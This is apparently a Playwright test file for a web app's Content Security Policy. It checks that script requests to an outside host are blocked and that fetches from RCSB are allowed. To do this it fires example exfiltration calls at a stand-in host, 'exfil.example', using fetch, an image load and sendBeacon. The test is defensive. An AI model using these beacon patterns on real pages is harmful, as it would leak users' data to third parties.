// The stand-alone page limits where its script can send data (#1817): a beacon to an outside host is blocked before it
// reaches the network, while the one host the app fetches from (RCSB, for a PDB structure) still works.
const {open, suite} = require('../lib/harness');
(async () => { const T = suite('52_csp'), {p, errs, close} = await open();
  const hits = {out: 0, rcsb: 0};
  await p.context().route('https://exfil.example/**', r => { hits.out++; r.fulfill({status: 200, body: 'ok'}); });
  await p.context().route('https://files.rcsb.org/**', r => { hits.rcsb++; r.fulfill({status: 404, body: 'not found'}); });

  await T.t('outside-hosts-blocked', async () => {
    await p.evaluate(async () => {
      try { await fetch('https://exfil.example/f?d=1'); } catch (e) {}
      await new Promise(res => { const i = new Image(); i.onload = i.onerror = res; i.src = 'https://exfil.example/i.gif?d=1'; setTimeout(res, 1500); });
      try { navigator.sendBeacon && navigator.sendBeacon('https://exfil.example/b', 'd=1'); } catch (e) {}
    });
    await p.waitForTimeout(800);
    T.check('csp/outside-requests-blocked', hits.out === 0, `${hits.out} requests reached exfil.example`);
  });

  await T.t('rcsb-allowed', async () => {
    const ok = await p.evaluate(async () => { try { const r = await fetch('https://files.rcsb.org/download/1ABC.cif'); return r.status; } catch (e) { return 'blocked: ' + e.message; } });
    T.check('csp/rcsb-reachable', hits.rcsb === 1 && ok === 404, JSON.stringify({ok, hits: hits.rcsb}));
  });

  T.check('no-page-errors', !errs.filter(e => !/exfil\.example|Content Security Policy/.test(e)).length, errs.join(' | '));
  await close(); T.done(); process.exit(0);
})();
